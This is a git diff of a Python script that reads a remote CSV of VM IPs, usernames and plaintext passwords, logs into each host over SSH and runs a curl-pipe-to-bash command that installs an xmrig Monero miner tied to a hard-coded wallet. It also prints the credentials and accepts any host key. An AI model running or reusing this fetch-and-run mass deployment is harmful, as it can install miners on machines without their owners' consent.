@@ -1,24 +1,25 @@
 #!/usr/local/bin/python
 # deploy.py: Deploy Multiple VM's from csv on github
+# Version 1.0
 
-import csv # working with csv
-import paramiko # SSH Client
-import requests # used for Downloading the CSV file
+import csv
+import paramiko
+import requests
 
 
 
 # ===========================================================================================================================================
-# VARS
+# VARS - Please modify this section as you require
+# ===========================================================================================================================================
+url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/xmrigproxy.csv' # Set this to the location of your csv file
+xmr_addy = '47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q' # Please make sure to set your XMR Address here
 # ===========================================================================================================================================
 
-#set your URL HERE
-url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/xmrigproxy.csv'
+# ===========================================================================================================================================
 
-# Set your commands here, one per line
-sshcmd = [
-    #" df -h" # Only used for Testing
-    "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/xmrigproxy.sh | bash -s 47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q"    
-]
+
+
+
 
 
 
@@ -26,23 +27,28 @@ sshcmd = [
 # Do not edit below this line
 # ===========================================================================================================================================
 
-#download the latest csv file and save it as list.csv
+install_cmd = "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/xmrigproxy.sh | bash -s " + xmr_addy
+sshcmd = [
+    install_cmd # Runs the setup command
+]
+print("Downloading csv from: ", url, " Please make sure this file is up to date!")
 req = requests.get(url)
 url_content = req.content
 csv_file = open("list.csv","wb")
 csv_file.write(url_content)
 csv_file.close()
+print("File Has been downloaded and saved to your computer!")
 
-
-with open('list.csv', 'r') as csvfile:  # opens file on desktop that we just saved
+print("Processing The CSV file")
+print("we will be installing the miner with the following command :", sshcmd[0])
+with open('list.csv', 'r') as csvfile:  
     reader = csv.DictReader(csvfile)
     for row in reader:
 
 
-        print("Connecting to VM")
-        print('IP Address: ', row['ip'], ' Username: ', row['user'], ' Password: ', row['pass'])
+        print('Connecting to VM - IP Address: ', row['ip'], ' Username: ', row['user'], ' Password: ', row['pass'])
 
-        # Make the connection
+        
         try:
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -52,7 +58,7 @@ with open('list.csv', 'r') as csvfile:  # opens file on desktop that we just sav
                 print( "[!] ERROR CONNECTING TO ", row['ip'])
                 
             
-            #If we are here we should be connected?
+            
             for command in sshcmd:
                 print("="*50, command, "="*50)
                 stdin, stdout, stderr = client.exec_command(command)
@@ -62,6 +68,7 @@ with open('list.csv', 'r') as csvfile:  # opens file on desktop that we just sav
                     print(err)
         except:
             print( "[!] ERROR, Timed out")
+
+        print('VM been completed and xmrig has started')
             
 # TODO: Delete CSV file after, but fuck it i'm lazy
-
